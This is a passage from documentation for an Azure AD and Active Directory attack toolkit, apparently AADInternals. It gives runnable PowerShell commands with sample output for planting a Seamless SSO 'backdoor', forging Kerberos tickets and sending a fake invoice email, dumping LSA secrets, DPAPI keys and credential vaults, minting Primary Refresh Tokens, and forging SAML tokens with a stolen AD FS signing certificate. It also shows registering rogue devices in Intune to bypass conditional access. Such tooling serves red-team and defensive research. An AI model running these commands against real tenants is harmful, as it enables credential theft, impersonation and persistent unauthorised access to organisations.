					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.microsoft.com/claims/authnmethodsreferences"                    Value="urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"          ValueType="http://www.w3.org/2001/XMLSchema#string"/>
				</ClaimCollection>
			</Identity>
		</Identities>
	</ClaimsPrincipal>
	<EndpointId/>
</SessionToken>
{{< /highlight>}}


## Hack functions: Seamless Single-sign-on (DesktopSSO)

### Get-AADIntDesktopSSO (P)
Since version 0.2.6 <br>
Shows the Desktop SSO (a.k.a. Seamless SSO) status of the tenant. 

**Example:**
{{< highlight powershell >}}
# Create an access token for PTA
$pt=Get-AADIntAccessTokenForPTA

# Show the DesktopSSO status
Get-AADIntDesktopSSO -AccessToken $pt
{{< /highlight>}}

**Output:**
```
Domains      : 
Enabled      : False
ErrorMessage : 
Exists       : True
IsSuccessful : True
```



### Set-AADIntDesktopSSOEnabled (P)
Since version 0.2.6 <br>
Sets DesktopSSO information for the given domain. In other words, **you can create a backdoor!** 
It can also be used to change the password of the existing DesktopSSO configuration to AzureAD and to reset the password of the computer account used for SSO (default is AZUREADSSOACC).

**Example:**
{{< highlight powershell >}}
# Create an access token for PTA
$pt=Get-AADIntAccessTokenForPTA

# Enable the DesktopSSO for the given domain
Set-AADIntDesktopSSO -AccessToken $pt -DomainName company.com -Password "mypassword" -Enable $true
{{< /highlight>}}

**Output:**
```
IsSuccessful ErrorMessage
------------ ------------
        True
```
{{< highlight powershell >}}
# Show the DesktopSSO status
Get-AADIntDesktopSSO -AccessToken $pt
{{< /highlight>}}
**Output:**
```
Domains      : company.com
Enabled      : True
ErrorMessage : 
Exists       : True
IsSuccessful : True
```

### New-AADIntKerberosTicket
Since version 0.2.6 <br>
This function creates a Kerberos ticket with given user details and server (usually AZUREADSSOACC) password. Uses only user's SID and server password. 

User SID can be given as a SID object, SID string, or UserPrincipalNane (UPN). If UPN is given, SID is searched from AD or AAD. 
For AD, the user running the command need to have read access to AD. For AAD, an access token for Azure AD Graph needs to be given.

**Note!** The Kerberos ticket is valid only for a couple of minutes!

**Example:**
{{< highlight powershell >}}
# Create a Kerberos ticket
$kt=New-AADIntKerberosTicket -ADUserPrincipalName "user@company.com" -Password "mypassword"

# Get an access token for Exchange Online
$et=Get-AADIntAccessTokenForEXO -KerberosTicket $kt -Domain company.com

# Send an email using Outlook API
Send-AADIntOutlookMessage -AccessToken $et -Recipient "accounting@company.com" -Subject "Invoice" -Message "Pay the attached invoice <b>ASAP!</b>"

{{< /highlight>}}

## Hack functions: Active Directory

### Get-AADIntDPAPIKeys (*)
Since version 0.3.0 <br>
Gets DPAPI system keys which can be used to decrypt secrets of all users encrypted with DPAPI.
MUST be run on a domain controller as an administrator.

**Example:**
{{< highlight powershell >}}
# Get DPAPI keys
Get-AADIntDPAPIKeys
{{< /highlight>}}

**Output:**
```
UserKey               UserKeyHex                               MachineKey            MachineKeyHex                           
-------               ----------                               ----------            -------------                           
{16, 130, 39, 122...} 1082277ac85a532018930b782c30b7f2f91f7677 {226, 88, 102, 95...} e258665f0a016a7c215ceaf29ee1ae17b9f017b9
```

### Get-AADIntLSASecrets (*)
Since version 0.3.0 <br>
Gets computer's Local Security Authority (LSA) secrets. MUST be run as an administrator.

**Example 1:**
{{< highlight powershell >}}
# Get LSA secrets
Get-AADIntLSASecrets
{{< /highlight>}}

**Output:**
```
Name        : $MACHINE.ACC
Account     : 
Password    : {131, 100, 104, 117...}
PasswordHex : 836468758afd792..
PasswordTxt : 撃畨ﶊ⵹脅䰐血⺹颶姾..
Credentials : 
MD4         : {219, 201, 145, 228...}
SHA1        : {216, 95, 90, 3...}
MD4Txt      : dbc991e4e611cf4dbd0d853f54489caf
SHA1Txt     : d85f5a030b06061329ba93ac7da2f446981a02b6

Name        : DPAPI_SYSTEM
Account     : 
Password    : {1, 0, 0, 0...}
PasswordHex : 010000000c63b569390..
PasswordTxt :  挌榵9႘ૂਧ绣똚鲐쒽뾮㌡懅..
Credentials : 
MD4         : {85, 41, 246, 248...}
SHA1        : {32, 31, 39, 107...}
MD4Txt      : 5529f6f89c797f7d95224a554f460ea5
SHA1Txt     : 201f276b05fa087a0b7e37f7052d581813d52b46

Name        : NL$KM
Account     : 
Password    : {209, 118, 66, 10...}
PasswordHex : d176420abde330d3e443212b...
PasswordTxt : 监ੂ팰䏤⬡ꎛ녀䚃劤⪠钤␎／뜕ະ׏...
Credentials : 
MD4         : {157, 45, 19, 202...}
SHA1        : {197, 144, 115, 117...}
MD4Txt      : 9d2d13cac899b491114129e5ebe00939
SHA1Txt     : c590737514c8f22607fc79d771b61b1a1505c3ee

Name        : _SC_AADConnectProvisioningAgent
Account     : COMPANY\provAgentgMSA
Password    : {176, 38, 6, 7...}
PasswordHex : b02606075f962ab4474bd570dc..
PasswordTxt : ⚰܆陟됪䭇...
Credentials : System.Management.Automation.PSCredential
MD4         : {123, 211, 194, 182...}
SHA1        : {193, 238, 187, 166...}
MD4Txt      : 7bd3c2b62b66024e4e066a1f4902221e
SHA1Txt     : c1eebba61a72d8a4e78b1cefd27c555b83a39cb4

Name        : _SC_ADSync
Account     : COMPANY\AAD_5baf82738e9c
Password    : {41, 0, 45, 0...}
PasswordHex : 29002d004e0024002a00...
PasswordTxt : )-N$*s=322jSQnm-YG#z2z...
Credentials : System.Management.Automation.PSCredential
MD4         : {81, 210, 222, 155...}
SHA1        : {94, 74, 122, 142...}
MD4Txt      : 51d2de9b89b81d0cb371a829a2d19fe2
SHA1Txt     : 5e4a7a8e220652c11cf64d25b1dcf63da7ce4bf1

Name        : _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_15030c93b7affb1fe7dc418b9dab42addf5
			  74c56b3e7a83450fc4f3f8a382028
Account     : 
Password    : {131, 250, 57, 146...}
PasswordHex : 83fa3992cd076f3476e8be7e04...
PasswordTxt : 廙鈹ߍ㑯纾�≦瀛･௰镭꾔浪�ꨲ컸Ｏ⩂�..
Credentials : 
MD4         : {198, 74, 199, 231...}
SHA1        : {78, 213, 16, 126...}
MD4Txt      : c64ac7e7d2defe99afdf0026b79bbab9
SHA1Txt     : 4ed5107ee08123635f08390e106ed000f96273fd

Name        : _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_15030c93b7affb1fe7dc418b9dab42addf574c56b
			  3e7a83450fc4f3f8a382028
Account     : COMPANY\sv_ADFS
Password    : {213, 89, 245, 60...}
PasswordHex : d559f53cdc2aa6dffe32d6b23...
PasswordTxt : 姕㳵⫝̸�㋾닖�स䥥⫮Ꭸ베꺻ᢆ㒍梩神蔼廄...
Credentials : System.Management.Automation.PSCredential
MD4         : {223, 4, 60, 193...}
SHA1        : {86, 201, 125, 70...}
MD4Txt      : df043cc10709bd9f94aa273ec7a54b68
SHA1Txt     : 56c97d46b5072ebb8c5c7bfad4b8c1c18f3b48d0
```

**Example 2:**
{{< highlight powershell >}}
# Get LSA secret for the given account
Get-AADIntLSASecrets -AccountName COMPANY\AAD_5baf82738e9c
{{< /highlight>}}

**Output:**
```
Name        : _SC_ADSync
Account     : COMPANY\AAD_5baf82738e9c
Password    : {41, 0, 45, 0...}
PasswordHex : 29002d004e0024002a00...
PasswordTxt : )-N$*s=322jSQnm-YG#z2z...
Credentials : System.Management.Automation.PSCredential
MD4         : {81, 210, 222, 155...}
SHA1        : {94, 74, 122, 142...}
MD4Txt      : 51d2de9b89b81d0cb371a829a2d19fe2
SHA1Txt     : 5e4a7a8e220652c11cf64d25b1dcf63da7ce4bf1
```

**Example 3:**
{{< highlight powershell >}}
# Get LSA secret for the given account
Get-AADIntLSASecrets -AccountName COMPANY\sv_ADFS
{{< /highlight>}}

**Output:**
```
Name        : _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_15030c93b7affb1fe7dc418b9dab42addf574c56b3e7a83450fc4f3f8a382028
Account     : COMPANY\sv_ADFS
Password    : {213, 89, 245, 60...}
PasswordHex : d559f53cdc2aa6dffe32d6b23...
PasswordTxt : 姕㳵⫝̸�㋾닖�स䥥⫮Ꭸ베꺻ᢆ㒍梩神蔼廄...
Credentials : System.Management.Automation.PSCredential
MD4         : {223, 4, 60, 193...}
SHA1        : {86, 201, 125, 70...}
MD4Txt      : df043cc10709bd9f94aa273ec7a54b68
SHA1Txt     : 56c97d46b5072ebb8c5c7bfad4b8c1c18f3b48d0
```

### Get-AADIntLSABackupKeys (*)
Since version 0.3.0 <br>
Gets Local Security Authority (LSA) backup keys which can be used to decrypt secrets of all users encrypted with DPAPI.
MUST be run as an administrator.

**Example:**
{{< highlight powershell >}}
# Get LSA backup keys
Get-AADIntLSABackupKeys
{{< /highlight>}}

**Output:**
```
certificate     Name   Id                                   Key                   
-----------     ----   --                                   ---                   
{1, 2, 3, 4...} RSA    e783c740-2284-4bd6-a121-7cc0d39a5077 {231, 131, 199, 64...}
				Legacy ff127a05-51b1-4d45-8655-30c883631d90 {255, 18, 122, 5...}
```

### Get-AADIntSystemMasterKeys (*)
Since version 0.3.0 <br>
Gets local system master keys with the given system backup key (LSA backup key).

**Example:**
{{< highlight powershell >}}
# Get the LSA backup keys
$lsabk_keys=Get-AADIntLSABackupKeys

# Save the private key to a variable
$rsa_key=$lsabk_keys | where name -eq RSA

# Get system master keys
Get-AADIntSystemMasterkeys -SystemKey $rsa_key.key
{{< /highlight>}}

**Output:**
```
Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
```

**Example:**
{{< highlight powershell >}}
# Get the LSA backup keys
$lsabk_keys=Get-AADIntLSABackupKeys

# Save the private key to a variable
$rsa_key=$lsabk_keys | where name -eq RSA

# Get user's master keys
Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -SystemKey $rsa_key.key
{{< /highlight>}}

**Output:**
```
Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b...
```

### Get-AADIntUserMasterKeys (*)
Since version 0.3.0 <br>
Gets user's master keys using the password or system backup key (LSA backup key).

**Example:**
{{< highlight powershell >}}
# Get user's master keys with username and password
Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -Password "password"
{{< /highlight>}}

**Output:**
```
Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b... {166, 95, 5, 216...}
```

**Example:**
{{< highlight powershell >}}
# Get user's master keys using LSA backup key
# Get the LSA backup keys
$lsabk_keys=Get-AADIntLSABackupKeys

# Save the private key to a variable
$rsa_key=$lsabk_keys | where name -eq RSA

# Get user's master keys
Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -SystemKey $rsa_key.key
{{< /highlight>}}

**Output:**
```
Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b...
```

### Get-AADIntLocalUserCredentials (*)
Since version 0.3.0 <br>
Gets user's credentials from the local credential vault.

**Note:** Currently supports only SHA1 hashing and 3DES encryption algorithms, so probably fails for "normal" users.

**Example:**
{{< highlight powershell >}}
# Get the LSA backup keys
$lsabk_keys=Get-AADIntLSABackupKeys

# Save the private key to a variable
$rsa_key=$lsabk_keys | where name -eq RSA

# Get user's master keys
$user_masterkeys=Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -SystemKey $rsa_key.key

# List user's credentials
Get-AADIntLocalUserCredentials -UserName "myuser" -MasterKeys $user_masterkeys
{{< /highlight>}}

**Output:**
```
Target        : LegacyGeneric:target=msTeams_autologon.microsoftazuread-sso.com:443/user@company.com
Persistance   : local_machine
Edited        : 26/03/2020 10.12.11
Alias         : 
Comment       : 
UserName      : 
Secret        : {97, 115, 100, 102...}
SecretTxt     : 獡晤晤
SecretTxtUtf8 : asdfdf
Attributes    : {}
```

## Hack functions: Azure AD join, MDM & PRT

### Get-AADIntUserPRTToken (*)
Since version 0.4.1 <br>
Gets user's PRT token from the Azure AD joined or Hybrid joined computer. Uses BrowserCore.exe to get the PRT token.

**Example:**
{{< highlight powershell >}}
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
{{< /highlight>}}

### Join-AADIntOnPremDeviceToAzureAD (A)
Since version 0.4.5 <br>
Emulates Azure AD Hybrid Join by adding a device to Azure AD via Synchronization API and generates a corresponding certificate (if not provided).

You may use any name, SID, device ID, or certificate you like.

The generated certificate can be used to complete the Hybrid Join using Join-AADIntDeviceToAzureAD. The certificate has no password.

After the synchronisation, the device appears as "Hybrid Azure AD joined" device which registration state is "Pending". The subject of the certificate must be "CN=<DeviceId>" or the Hybrid Join fails.

**Example:**
{{< highlight powershell >}}
# Get an access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Join the device to Azure AD
Join-AADIntOnPremDeviceToAzureAD -DeviceName "My computer"
{{< /highlight>}}
**Output:**
```
Device successfully created:
  Device Name:     "My computer"
  Device ID:       f24f116f-6e80-425d-8236-09803da7dfbe
  Device SID:      S-1-5-21-685966194-1071688910-211446493-3729
  Cloud Anchor:    Device_e049c29d-8c8f-4016-b959-98f3fccd668c
  Source Anchor:   bxFP8oBuXUKCNgmAPaffvg==
  Cert thumbprint: C59B20BCDE103F8B7911592FD7A8DDDD22696CE0
  Cert file name:  "f24f116f-6e80-425d-8236-09803da7dfbe-user.pfx"
```

### Join-AADIntDeviceToAzureAD (J)
Since version 0.4.1 <br>
Emulates Azure AD Join by registering the given device to Azure AD and generates a corresponding certificate. Supports also Hybrid Join since version 0.4.5 and Register since 0.4.6.

You may use any name, type or OS version you like.

The generated certificate can be used to create a Primary Refresh Token and P2P certificates. The certificate has no password.

**Example 1 - Register:**
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Register the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My first computer" -DeviceType "Commodore" -OSVersion "Vic20" -JoinType Register
{{< /highlight>}}
**Output:**
```
Device successfully registered to Azure AD:
  DisplayName:     "My first computer"
  DeviceId:        f6579fb2-8175-4508-95a7-ef11351983ee
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: A5B3A73FADF00D448025236BDFA389D8A5B3A73F
  Cert file name : "f6579fb2-8175-4508-95a7-ef11351983ee.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```

**Example 2 - Join:**
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
**Output:**
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```

**Example 3 - Hybrid Join:**
{{< highlight powershell >}}
# Get an access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Join the device to Azure AD
Join-AADIntOnPremDeviceToAzureAD -DeviceName "My computer"
{{< /highlight>}}
**Output:**
```
Device successfully created:
  Device Name:     "My computer"
  Device ID:       f24f116f-6e80-425d-8236-09803da7dfbe
  Device SID:      S-1-5-21-685966194-1071688910-211446493-3729
  Cloud Anchor:    Device_e049c29d-8c8f-4016-b959-98f3fccd668c
  Source Anchor:   bxFP8oBuXUKCNgmAPaffvg==
  Cert thumbprint: C59B20BCDE103F8B7911592FD7A8DDDD22696CE0
  Cert file name:  "f24f116f-6e80-425d-8236-09803da7dfbe-user.pfx"
```
{{< highlight powershell >}}
# Hybrid Join the device to Azure AD
Join-AADIntDeviceToAzureAD -TenantId 4362599e-fd46-44a9-997d-53bc7a3b2947 -DeviceName "My computer" -SID "S-1-5-21-685966194-1071688910-211446493-3729" -PfxFileName .\f24f116f-6e80-425d-8236-09803da7dfbe-user.pfx
{{< /highlight>}}
**Output:**
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        f24f116f-6e80-425d-8236-09803da7dfbe
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: A531B73CFBAB2BA26694BA2AD31113211CC2174A
  Cert file name : "f24f116f-6e80-425d-8236-09803da7dfbe.pfx"
```
**Example 4 - Hybrid Join by federation:**
{{< highlight powershell >}}
# Export AD FS token signing certificate
Export-AADIntADFSSigningCertificate

# Get AD FS issuer uri
$issuer = (Get-AdfsProperties).Identifier.OriginalString

# Create a new SAML token
$saml = New-AADIntSAMLToken -UserName "DESKTOP-9999" -DeviceGUID (New-Guid) -Issuer $issuer -PfxFileName .\ADFSSigningCertificate.pfx

# Get an access token for the device with the SAML token
Get-AADIntAccessTokenForAADJoin -SAMLToken $saml -Device -SaveToCache

# Hybrid join the device
Join-AADIntDeviceToAzureAD -DeviceName "DESKTOP-9999"
{{< /highlight>}}
**Output:**
```
Device successfully registered to Azure AD:
  DisplayName:     "DESKTOP-9999"
  DeviceId:        0810056c-d2d5-4c1b-bc17-2f2fbedd6ca3
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 3022FF7937C0766CE3DB0AD45C9413FB68A05EE3
  Cert file name : "0810056c-d2d5-4c1b-bc17-2f2fbedd6ca3.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-3240472016-1160587922-3614255014-3410032901
  S-1-12-1-2566832563-1141717763-392342924-578657198
```
### Get-AADIntUserPRTKeys (*)
Since version 0.4.1 <br>
Creates a new set of Primary Refresh Token (PRT) keys for the user, including a session key and a refresh_token (PRT).
Keys are saved to a json file.

**Example 1:**
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```
{{< highlight powershell >}}
# Get user's credentials
$creds = Get-Credential

# Get new PRT and key
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -Credentials $cred
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```
{{< highlight powershell >}}
# Get an access token for MDM and save to cache
Get-AADIntAccessTokenForIntuneMDM -SaveToCache

# Get new PRT and key
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -UseRefreshToken
{{< /highlight>}}

**Example 3:**
{{< highlight powershell >}}
# Export the local device certificate and transport keys
Export-AADIntLocalDeviceCertificate
Export-AADIntLocalDeviceTransportKey
{{< /highlight>}}
```
Device certificate exported to f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
```
{{< highlight powershell >}}
# Save credentials (omit if MFA required or you need MFA claim)
$creds = Get-Credential

# Get new PRT and session key
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx -TransportKeyFileName .\f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem -Credentials $creds

# Get PRT token
$prttoken = New-AADIntUserPRTToken -Settings $prtkeys -GetNonce
{{< /highlight>}}

### New-AADIntUserPRTToken (*)
Since version 0.4.1 <br>
Creates a new Primary Refresh Token (PRT) as JWT to be used to sign-in as the user.

**Example** (continuing the previous example):
{{< highlight powershell >}}
# Generate a new PRT token
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GetNonce

# Get the access token using the PRT token
$at = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
{{< /highlight>}}

### New-AADIntBulkPRTToken (A)
Since version 0.4.5 <br>
Creates a new BPRT (Bulk AAD PRT Token) for registering multiple devices to AAD. 
Adds a corresponding user to Azure AD with UPN "package_<guid>@<default domain>". 
The Display Name of the user can be defined.

The BPRT will be returned as a string and saved to a .json file.

**Example**:
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache

# Create a new BPRT
$bprt = New-AADIntBulkPRTToken -Name "My BPRT user"
{{< /highlight>}}

**Output:**
```
BPRT saved to package_8eb8b873-2b6a-4d55-bd96-27b0abadec6a-BPRT.json
```

{{< highlight powershell >}}
# Get the access token for AAD Join using BPRT
Get-AADIntAccessTokenForAADJoin -BPRT $BPRT -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer"
{{< /highlight>}}
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```
{{< highlight powershell >}}
# Get the access token for Intune using BPRT and Azure AD device certificate
Get-AADIntAccessTokenForIntuneMDM -BPRT $BPRT -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache

# Enroll the device to Intune
Join-AADIntDeviceToIntune -DeviceName "My computer"
{{< /highlight>}}
```
Intune client certificate successfully created:
  Subject:         "CN=5ede6e7a-7b77-41bd-bfe0-ef29ca70a3fb"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: A1D407FF66EF05D153B67129B8541058A1C395B1
  Cert file name:  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-CA.der"
  IntMedCA file :  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-INTMED-CA.der"
```

### New-AADIntP2PDeviceCertificate (*)
Since version 0.4.1 <br>
Creates a new peer-to-peer (P2P) device or user certificate and exports it and the corresponding CA certificate. It can be used to enable RDP trust between devices of the same AAD tenant.

**Example 1:**
{{< highlight powershell >}}
# Generate a new device P2P certificate using the device certificate
New-AADIntP2PDeviceCertificate -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -TenantId 4169fee0-df47-4e31-b1d7-5d248222b872 -DeviceName "mypc1.company.com"
{{< /highlight>}}
**Output:**
```
Device certificate successfully created:
  Subject:         "CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=4169fee0-df47-4e31-b1d7-5d248222b872"
  DnsName:         "mydevice.contoso.com"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: 84D7641F9BFA90767EA3456E443E21948FC425E5
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der"
```

**Example 2:**
{{< highlight powershell >}}
# Generate a new user P2P certificate using the PRT and session key
New-AADIntP2PDeviceCertificate -Settings $prtKeys
{{< /highlight>}}
**Output:**
```
User certificate successfully created:
  Subject:         "CN=TestU@contoso.com, CN=S-1-12-1-xx-xx-xx-xx, DC=0f73eaa6-7fd6-48b8-8897-e382ba96daf4"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: A7F1D1F134569E0234E6AA722354D99C3AA68D0F
  Cert file name : "TestU@contoso.com-P2P.pfx"
  CA file name :   "TestU@contoso.com-P2P-CA.der"
```

### Join-AADIntDeviceToIntuneMDM (M)
Since version 0.4.1 <br>
Enrolls the given device to Azure AD and generates a corresponding certificate.

After enrollment, the device is in compliant state, which allows bypassing conditional access (CA) restrictions based on the compliance.

The certificate has no password.

**Example:**
{{< highlight powershell >}}
# Get access token with device id claim
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache

# Enroll the device to Intune
Join-AADIntDeviceToIntune -DeviceName "My computer"
{{< /highlight>}}
**Output:**
```
Intune client certificate successfully created:
  Subject:         "CN=5ede6e7a-7b77-41bd-bfe0-ef29ca70a3fb"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: A1D407FF66EF05D153B67129B8541058A1C395B1
  Cert file name:  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-CA.der"
  IntMedCA file :  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-INTMED-CA.der"
```

### Start-AADIntDeviceDMSync (*)
Since version 0.4.2 <br>
Starts a device callback to Intune. Resets also the name of the device to given device name.

**Example:**
{{< highlight powershell >}}
# Start the device 
Start-AADIntDeviceIntuneCallback -pfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7MDM.pfx
{{< /highlight>}}

### Get-AADIntDeviceRegAuthMethods (A)
Since version 0.4.3 <br>
Get's the authentication methods used while registering the device.

For instance, if **mfa** was used while registering the device, also the PRT has mfa claim present.

**Example:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Get the authentication methods
Get-AADIntDeviceRegAuthMethods -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
{{< /highlight>}}
**Output:**
```
pwd
```

### Set-AADIntDeviceRegAuthMethods (A)
Since version 0.4.3 <br>
Set's the authentication methods used while registering the device.

**Example:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Set the authentication methods
Set-AADIntDeviceRegAuthMethods -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -Methods pwd,rsa,mfa
{{< /highlight>}}
**Output:**
```
pwd
rsa
mfa
```

### Get-AADIntDeviceTransportKey (A)
Since version 0.4.3 <br>
Gets the public key of transport key of the device created during registration/join.

**Example:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Export the transport key 
Get-AADIntDeviceTransportKey -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" 
{{< /highlight>}}
**Output:**
```
Device TKPUB key successfully exported:
  Device ID:             d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint:       4b56e1f1b80024359e34010d9aab3ced9c67ff5e
  Cert SHA256:           VD3rdP4R2KMzhp/TdqnoFTg6FaO5R0dE7LoC/H155M=
  Public key file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-TKPUB.json"
```

### Set-AADIntDeviceTransportKey (A)
Since version 0.4.3 <br>
Sets the public key of transport key of the device created during registration/join.

**Example1:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Change the transport key to the internal any.sts
Set-AADIntDeviceTransportKey -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -UseBuiltInCertificate
{{< /highlight>}}

**Example2:**
{{< highlight powershell >}}
# Change the transport key exported earlier
